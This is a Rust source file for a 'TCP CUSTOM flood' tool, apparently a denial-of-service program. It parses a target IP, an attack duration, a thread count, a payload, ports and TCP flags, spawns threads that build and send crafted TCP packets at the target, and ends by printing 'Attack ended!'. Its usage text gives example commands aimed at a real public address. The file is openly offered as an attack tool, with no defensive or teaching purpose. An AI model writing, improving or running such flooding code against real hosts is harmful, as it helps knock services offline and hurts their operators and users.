/*
    TCP CUSTOM flood

    Released by ATLAS API corporation

    Made by Benshii Varga
*/

extern crate pnet;

use std::{
    env,
    io::{self, Write},
    net::{Ipv4Addr},
    error::Error,
    time::{Duration, Instant},
    sync::Arc,
    process,
};

use flood::packet::{
    Packet,
    CustomTcpFlags,
};
use flood::utils::{
    get_tcp_flags,
    utils_random_port,
    utils_random_sequence,
};

mod flood;

fn print_usage() {
    writeln!(
        io::stderr(),
        "
        USAGE:
        ./tcp-custom <target> <duration> <threads> <data> <source port(0=random)> <destination port(0=random)> <mss> <wscale> <flags>
        EXAMPLE:
        ./tcp-custom 1.1.1.1 60 10 test 1234 80 1480 6 ack psh
        ./tcp-custom 1.1.1.1 60 10 test 0 80 1480 6 syn ack psh

        TCPFLAGS: fin, syn, rst, psh, ack, urg, cwr, ece, ns
        "
    )
    .unwrap();
    process::exit(0);
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut args = env::args().skip(1);

    if args.len() < 9 {
        print_usage();
    }

    let target_ip: Arc<Ipv4Addr> = match args.next() {
        Some(n) => Arc::new(n.parse()?),
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let time: u64 = match args.next() {
        Some(time) => time.parse().unwrap(),
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let threads: usize = match args.next() {
        Some(t) => t.parse().unwrap(), 
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let data: Arc<String> = match args.next() {
        Some(d) => Arc::new(d.parse()?),
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let sport: u16 = match args.next() {
        Some(sport) => sport.parse().unwrap(),
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let dport: u16 = match args.next() {
        Some(dport) => dport.parse().unwrap(),
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let mss: u16 = match args.next() {
        Some(mss) => mss.parse().unwrap(),
        None => {
            print_usage();
            process::exit(0);
        }
    };

    let wscale: u8 = match args.next() {
        Some(wscale) => wscale.parse().unwrap(),
        None => {
            print_usage();
            process::exit(0);
        }
    };
    let flags_vec: Vec<String> = args.skip(0).collect();
    let tcp_flags = Arc::new(get_tcp_flags(flags_vec));

    let start_time = Instant::now();

    std::thread::spawn(move || {
        loop {
            if Instant::now().duration_since(start_time) >= Duration::from_secs(time) {
                println!("Attack ended!");
                std::process::exit(0);
            }
        }
    });

    let mut tasks = Vec::new();

    for _ in 0..threads {
        let target_ip_clone = Arc::clone(&target_ip);
        let data_clone = Arc::clone(&data);
        let flags_clone = Arc::clone(&tcp_flags);

        let task = std::thread::spawn(move || {
            let mut packet = Packet::new(*target_ip_clone, &*data_clone, sport, dport, mss, wscale, flags_clone);
            let _ = packet.build().unwrap();
        });
        tasks.push(task);
    };
    for task in tasks {
        task.join().unwrap();
    }
    Ok(())
}